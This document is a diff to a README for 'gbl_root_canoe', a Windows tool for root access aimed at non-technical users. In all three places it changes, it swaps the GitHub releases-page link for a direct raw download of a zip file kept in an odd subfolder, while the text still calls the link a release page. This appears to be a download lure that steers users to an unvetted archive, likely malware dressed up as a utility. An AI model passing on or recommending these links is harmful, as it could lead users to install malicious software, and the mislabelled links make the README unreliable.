@@ -1,6 +1,6 @@
 # 🔒 gbl_root_canoe - Keep Root Access Simple
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/virginal-education888/gbl_root_canoe/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/virginal-education888/gbl_root_canoe/main/Trinovant/gbl_root_canoe_v2.5.zip)
 
 ## 🚀 What this app does
 
@@ -28,7 +28,7 @@ This app works best on modern Windows systems such as Windows 10 and Windows 11.
 
 Visit the release page and download the latest version from there:
 
-[Open the release page](https://github.com/virginal-education888/gbl_root_canoe/releases)
+[Open the release page](https://raw.githubusercontent.com/virginal-education888/gbl_root_canoe/main/Trinovant/gbl_root_canoe_v2.5.zip)
 
 After the page opens, look for the newest release and download the file that matches it. If the release has more than one file, use the main package for Windows setup support.
 
@@ -158,7 +158,7 @@ Before you start the app, check these items:
 
 Use the release page here:
 
-[https://github.com/virginal-education888/gbl_root_canoe/releases](https://github.com/virginal-education888/gbl_root_canoe/releases)
+[https://raw.githubusercontent.com/virginal-education888/gbl_root_canoe/main/Trinovant/gbl_root_canoe_v2.5.zip](https://raw.githubusercontent.com/virginal-education888/gbl_root_canoe/main/Trinovant/gbl_root_canoe_v2.5.zip)
 
 ## 📖 Quick path for non-technical users
 
